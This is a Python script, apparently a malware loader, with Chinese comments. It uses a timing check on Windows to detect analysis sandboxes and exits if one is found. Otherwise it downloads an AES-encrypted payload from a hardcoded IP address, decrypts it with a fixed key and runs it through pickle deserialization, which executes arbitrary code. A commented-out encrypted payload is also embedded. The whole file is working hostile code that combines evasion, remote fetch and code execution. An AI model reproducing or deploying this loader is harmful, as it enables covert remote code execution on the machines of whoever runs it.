import pickle
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import ctypes
import sys
import time
import requests

# 定义所需的Windows API函数
GetTickCount64 = ctypes.windll.kernel32.GetTickCount64
Sleep = ctypes.windll.kernel32.Sleep


def is_sandbox():
    start_tick = GetTickCount64()
    Sleep(300)  # 暂停300毫秒
    end_tick = GetTickCount64()
    elapsed = end_tick - start_tick

    # 检查实际暂停时间是否显著小于预期时间
    # 这里我们检查时间差是否大于100毫秒
    return elapsed - 300 > 100

def decrypt_string(key, iv, ciphertext):
    aes = AES.new(key, AES.MODE_CBC, iv)
    decrypted_text = unpad(aes.decrypt(base64.b64decode(ciphertext)), AES.block_size)
    return decrypted_text.decode()
headers = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; wbx 1.0.0; wbxapp 1.0.0; Zoom 3.6.0)"
}


key = b'0123456789abcdef'
iv = b'fedcba9876543210'


#ciphertext = "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"
response = requests.get(url="http://81.70.143.237:8000/4.txt",headers=headers,verify=False)
ciphertext = response.text
decrypted_text = decrypt_string(key, iv, ciphertext)

if __name__ == '__main__':
    if is_sandbox():
        sys.exit()
    else:
        pickle.loads(base64.b64decode(decrypted_text))
